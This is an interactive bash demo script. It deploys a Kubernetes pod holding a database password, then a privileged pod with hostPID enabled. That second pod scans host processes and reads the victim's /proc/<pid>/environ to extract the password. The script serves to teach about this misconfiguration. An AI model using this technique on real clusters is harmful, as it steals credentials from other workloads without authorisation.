#!/usr/bin/env bash
set -euo pipefail

# Terminal formatting
RED="\033[0;31m"
GREEN="\033[0;32m"
CYAN="\033[0;36m"
ORANGE="\033[38;5;208m" # Vibrant 256-color Orange
MAGENTA="\033[0;35m"
BOLD="\033[1m"
NC="\033[0m"

# Interactive pause and command runner
step() {
    local intent="$1"
    local cmd="$2"
    
    echo -e "\n${ORANGE}----------------------------------------------------${NC}"
    echo -e "${ORANGE}${BOLD}INTENT:${NC} ${ORANGE}${intent}${NC}"
    echo -e "${ORANGE}----------------------------------------------------${NC}"
    echo -e "${MAGENTA}$ ${cmd}${NC}"
    echo -en "${CYAN}[Press ENTER to execute command...]${NC}"
    read -r
    echo ""
    eval "$cmd"
}

# Automatic cleanup handler
cleanup() {
    echo -e "\n${CYAN}Triggering cleanup of demo resources...${NC}"
    kubectl delete pod target-app inspector-pod --force --grace-period=0 --ignore-not-found=true >/dev/null 2>&1
    echo -e "${GREEN}Cleanup complete. Cluster returned to clean state.${NC}"
}

trap cleanup EXIT SIGINT

clear
echo -e "${CYAN}====================================================${NC}"
echo -e "${CYAN}   Interactive Pod Security Misconfiguration Demo    ${NC}"
echo -e "${CYAN}====================================================${NC}"

# --- PHASE 1 ---
step "PHASE 1: Deploy a normal victim pod carrying a database password in its environment." \
"cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: target-app
spec:
  containers:
  - name: target-app
    image: alpine:latest
    command: [\"/bin/sh\", \"-c\", \"while true; do sleep 3600; done\"]
    env:
    - name: DB_PASSWORD
      value: \"SuperSecretPassword123!\"
EOF"

step "VERIFY: Wait for victim pod, show IP/node status & creation events." \
"kubectl wait --for=condition=Ready pod/target-app --timeout=60s && kubectl get pod target-app -o wide && echo '' && kubectl get events --field-selector involvedObject.name=target-app --sort-by='.metadata.creationTimestamp' | tail -n 5"

# --- PHASE 2 ---
step "PHASE 2: Deploy an attacker pod configured with hostPID: true and privileged mode." \
"cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: inspector-pod
spec:
  hostPID: true
  containers:
  - name: inspector
    image: alpine:latest
    command: [\"/bin/sh\", \"-c\", \"while true; do sleep 3600; done\"]
    securityContext:
      privileged: true
EOF"

step "VERIFY: Confirm both pods are running on the same host node." \
"kubectl wait --for=condition=Ready pod/inspector-pod --timeout=60s && kubectl get pods -o wide"

# --- PHASE 3 ---
step "ATTACKER STEP 1: Scan host processes from inside inspector-pod to find victim workloads." \
"kubectl exec inspector-pod -- ps -ef | grep 'sleep 3600' | grep -v grep"

step "ATTACKER STEP 2: Extract the Host PID of the victim process." \
"export TARGET_PID=\$(kubectl exec inspector-pod -- /bin/sh -c \"ps -ef | grep 'sleep 3600' | grep -v grep | awk '{print \\\$1}' | head -n 1\") && echo \"Target Process Host PID: \$TARGET_PID\""

step "ATTACKER STEP 3: Inspect /proc/<PID>/environ from inspector-pod to dump victim memory." \
"kubectl exec inspector-pod -- /bin/sh -c \"cat /proc/\\\$(ps -ef | grep 'sleep 3600' | grep -v grep | awk '{print \\\$1}' | head -n 1)/environ | tr '\\\\0' '\\\\n' | grep DB_PASSWORD\""

step "AUDIT: Inspect Kubernetes cluster events proving scheduling and execution timestamps." \
"kubectl get events --field-selector involvedObject.kind=Pod --sort-by='.metadata.creationTimestamp' | tail -n 6"

echo -e "\n${GREEN}Demo walkthrough completed successfully!${NC}"
